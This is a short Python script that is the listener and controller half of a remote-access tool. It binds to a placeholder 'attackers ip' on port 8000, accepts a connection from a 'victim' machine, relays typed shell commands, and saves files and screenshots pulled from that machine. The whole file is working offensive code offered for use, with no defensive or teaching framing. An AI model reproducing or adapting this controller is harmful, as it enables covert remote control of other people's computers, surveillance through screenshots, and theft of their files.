#!/usr/bin/python3
import socket
import sys
import datetime
#if you have a public ip then its the perfect one to use otherwise use your
#internal ip and ensure the victim is on the same network
IP_ADDR = 'attackers ip'
PORT = 8000

#create_sock handles our socket connection
def create_sock(ip_addr, serv_port):
    try:
        sock_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock_conn.bind((ip_addr, serv_port))
        sock_conn.listen(5)
        return sock_conn
    except socket.gaierror:
        print("Unable to create connection")
        sys.exit()
    except socket.error:
        print("something went wrong")
        sys.exit()
    except KeyboardInterrupt:
        print("Interrupted by user")
        sys.exit()

    except ConnectionResetError:
        print("Client has disconnected")
        sys.exit()

#the fxn will handle the screenshots and save them using the current time
def screenshot():
    file_name = str(datetime.datetime.now().time())

    file_name = file_name.split(".")[0].replace(":", "-")
    file_name = file_name + '.png'
    with open(file_name, "wb") as f:
        image = client.recv(1024)
        f.write(image)
        while not ("completeServing" in str(image)):
            image = client.recv(1024)
            f.write(image)
#download a file from victim machine
def download(filename):

    with open(filename,"wb") as f:
        content = client.recv(1024)
        f.write(content)
        while not ("completeServing"  in str(content)):
            content = client.recv(1024)
            f.write(content)



def accept_conn(socket_connection):
    client_conn, addr_client = socket_connection.accept()
    return client_conn, addr_client


def perform_task(client_conn):
    while True:
        try:
            command = input(">")
            if not command.split():
                print("enter command")
                continue

            command = str.encode(command)
            client.send(command)
            while True:
                data = client.recv(1024)

                if len(data) > 0:
                    if "uploading" in data.decode("utf-8","replace"):

                        filename = command.decode("utf-8","replace").split(" ")[1]
                        download(filename)

                        continue
                    # while "image" in data.decode("utf-8","replace"):
                    if "image" in data.decode("utf-8", "replace"):
                        screenshot()
                        continue
                    print((data.decode("utf-8", "replace")),end = ' ')
                    if 'done' in data.decode("utf-8", "replace"):
                        break

                    if "exit" in data.decode("utf-8", "replace"):
                        print("\n")
                        sys.exit()
        except KeyboardInterrupt:
            print("Exiting the shell")
            sys.exit()



if __name__ == '__main__':

    sock = create_sock(IP_ADDR, PORT)
    client, addr = accept_conn(sock)
    perform_task(client)



